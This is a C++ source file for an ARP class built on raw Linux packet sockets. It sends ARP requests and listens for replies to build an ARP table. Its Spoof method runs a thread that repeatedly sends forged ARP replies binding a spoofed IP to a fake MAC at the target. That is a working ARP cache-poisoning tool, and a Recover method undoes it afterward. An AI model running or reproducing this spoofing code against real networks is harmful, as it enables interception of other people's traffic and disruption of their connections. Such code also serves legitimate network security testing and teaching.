#include "models/arp.hh"
#include "utils/mac_utils.hh"
#include "utils/socket_utils.hh"
#include "utils/thread_utils.hh"

#include <atomic>
#include <chrono>
#include <cstring>
#include <functional>
#include <iostream>
#include <thread>

#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_packet.h>

using Clock = std::chrono::high_resolution_clock;

ARP::ARP(Interface interface) : interface_(std::move(interface)) {
  this->socket_fd_ = socket_utils::OpenSocket(interface_.GetIp());
  socket_utils::BindSocket(this->socket_fd_, interface_.GetName());
}

ARP::ARP() = default;

ARP::~ARP() {
  if (thread_utils::listening_thread[interface_.GetIp()].joinable()) {
    thread_utils::listen_signal[interface_.GetIp()].store(false, std::memory_order_relaxed);
    thread_utils::listening_thread[interface_.GetIp()].join();
  }
}

struct sockaddr_ll ARP::PrepareArp(unsigned char *buffer, const uint32_t &dst_ip, Operation operation,
                                   const std::string &dst_mac, const uint32_t &src_ip,
                                   const std::string &src_mac) const {
  memset(buffer, 0, BUF_SIZE);
  unsigned char mac_address[MAC_LENGTH];

  struct sockaddr_ll socket_address;
  socket_address.sll_family = AF_PACKET;
  socket_address.sll_protocol = htons(ETH_P_ARP);
  socket_address.sll_ifindex = socket_utils::GetInterfaceIndex(socket_fd_, interface_.GetName());
  socket_address.sll_hatype = htons(ARPHRD_ETHER);
  socket_address.sll_pkttype = PACKET_BROADCAST;
  socket_address.sll_halen = MAC_LENGTH;
  socket_address.sll_addr[6] = 0x00;
  socket_address.sll_addr[7] = 0x00;

  struct ethhdr *send_req = reinterpret_cast<struct ethhdr *>(buffer);
  struct ArpHeader *arp_req = reinterpret_cast<struct ArpHeader *>(buffer + ETH2_HEADER_LEN);

  // fill dst mac
  if (operation == Operation::REQUEST) {
    // Broadcast
    memset(send_req->h_dest, 0xff, MAC_LENGTH);
    // Target MAC zero
    memset(arp_req->target_mac_, 0x00, MAC_LENGTH);
  } else {
    mac_utils::StringToByte(mac_address, dst_mac);
    memcpy(send_req->h_dest, mac_address, MAC_LENGTH);
    memcpy(arp_req->target_mac_, mac_address, MAC_LENGTH);
  }

  // fill src mac
  if (operation == Operation::REQUEST) {
    std::string interface_mac_address = mac_utils::GetInterfaceMacAddress(socket_fd_, interface_.GetName());
    mac_utils::StringToByte(mac_address, interface_mac_address);
  } else {
    mac_utils::StringToByte(mac_address, src_mac);
  }
  memcpy(send_req->h_source, mac_address, MAC_LENGTH);
  memcpy(arp_req->sender_mac_, mac_address, MAC_LENGTH);
  memcpy(socket_address.sll_addr, mac_address, MAC_LENGTH);

  send_req->h_proto = htons(ETH_P_ARP);

  arp_req->hardware_type_ = htons(HW_TYPE);
  arp_req->protocol_type_ = htons(ETH_P_IP);
  arp_req->hardware_len_ = MAC_LENGTH;
  arp_req->protocol_len_ = IPV4_LENGTH;
  arp_req->opcode_ = htons(operation == Operation::REQUEST ? ARP_REQUEST : ARP_REPLY);

  memcpy(arp_req->sender_ip_, &src_ip, sizeof(uint32_t));
  memcpy(arp_req->target_ip_, &dst_ip, sizeof(uint32_t));

  return socket_address;
}

void ARP::InternalListen(std::map<std::string, std::string> &arp_table) const {
  unsigned char buffer[BUF_SIZE];
  while (thread_utils::listen_signal[interface_.GetIp()].load(std::memory_order_relaxed)) {
    ssize_t recv_len = recvfrom(socket_fd_, buffer, BUF_SIZE, 0, nullptr, nullptr);
    if (recv_len == -1) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        errno = 0;
        continue;
      }
      std::cerr << "_listen: Failed to receive packet.\n";
      return;
    }

    struct ethhdr *rcv_resp = reinterpret_cast<struct ethhdr *>(buffer);
    struct ArpHeader *arp_resp = reinterpret_cast<struct ArpHeader *>(buffer + ETH2_HEADER_LEN);

    if (ntohs(rcv_resp->h_proto) != PROTO_ARP) {
      continue;
    }

    if (ntohs(arp_resp->opcode_) != ARP_REPLY) {
      continue;
    }

    struct in_addr sender_addr;
    memset(&sender_addr, 0, sizeof(struct in_addr));
    memcpy(&sender_addr.s_addr, arp_resp->sender_ip_, sizeof(uint32_t));
    std::string sender_ip = std::string(inet_ntoa(sender_addr));
    std::string sender_mac = mac_utils::ByteToString(arp_resp->sender_mac_);

    arp_table[sender_ip] = sender_mac;
  }
}

void ARP::Listen(std::map<std::string, std::string> &arp_table) const {
  thread_utils::listen_signal[interface_.GetIp()].store(true, std::memory_order_relaxed);
  thread_utils::listening_thread[interface_.GetIp()] = std::thread(&ARP::InternalListen, this, std::ref(arp_table));
}

void ARP::InternalSpoof(const Host &target, const std::string &spoof_src_ip, const int socket_fd_,
                        const int attack_interval_ms, const std::string &fake_mac_address) const {
  unsigned char buffer[BUF_SIZE];
  std::string target_ip = target.GetIp();
  uint32_t src_ip = inet_addr(spoof_src_ip.c_str());
  uint32_t dst_ip = inet_addr(target_ip.c_str());
  struct sockaddr_ll socket_address =
      PrepareArp(buffer, dst_ip, Operation::SPOOF, target.GetMac(), src_ip, fake_mac_address);

  auto last_attack_time = Clock::now();  // let auto determine the type
  last_attack_time = {};                 // then clear the time_point

  while (thread_utils::spoof_signal[target_ip][spoof_src_ip].load(std::memory_order_relaxed)) {
    auto current_time = Clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_attack_time).count();
    if (duration < attack_interval_ms) {
      continue;  // wait for some amount of time before the next spoofing packet.
    }

    if (sendto(socket_fd_, buffer, 42, 0, reinterpret_cast<struct sockaddr *>(&socket_address),
               sizeof(socket_address)) == -1) {
      std::cerr << "_spoof: Failed to send spoof packet.\n";
    }

    last_attack_time = current_time;
  }
}

void ARP::Request(const std::string &target_ip) const {
  unsigned char buffer[BUF_SIZE];
  uint32_t dst_ip = inet_addr(target_ip.c_str());
  struct sockaddr_ll socket_address = PrepareArp(buffer, dst_ip);

  if (sendto(socket_fd_, buffer, 42, 0, reinterpret_cast<struct sockaddr *>(&socket_address), sizeof(socket_address)) ==
      -1) {
    std::cerr << "request: Failed to send arp request.\n";
  }
}

void ARP::Spoof(const Host &target, const Host &spoof_src, const int attack_interval_ms,
                const std::string &fake_mac_address) const {
  std::string spoof_src_ip = spoof_src.GetIp();
  thread_utils::spoof_signal[target.GetIp()][spoof_src_ip].store(true, std::memory_order_relaxed);
  thread_utils::spoof_thread[target.GetIp()][spoof_src_ip] =
      std::thread(&ARP::InternalSpoof, this, target, spoof_src_ip, socket_fd_, attack_interval_ms, fake_mac_address);
}

void ARP::Recover(const Host &target, const Host &spoof_src) const {
  std::string target_ip = target.GetIp();
  std::string spoof_src_ip = spoof_src.GetIp();

  if (thread_utils::StopThread(target_ip, spoof_src_ip)) {
    unsigned char buffer[BUF_SIZE];
    uint32_t dst_ip = inet_addr(target_ip.c_str());
    uint32_t src_ip = inet_addr(spoof_src_ip.c_str());
    struct sockaddr_ll socket_address =
        PrepareArp(buffer, dst_ip, Operation::RECOVER, target.GetMac(), src_ip, spoof_src.GetMac());
    if (sendto(socket_fd_, buffer, 42, 0, reinterpret_cast<struct sockaddr *>(&socket_address),
               sizeof(socket_address)) == -1) {
      std::cerr << "recover: Failed to send recover packet.\n";
    }
  }
}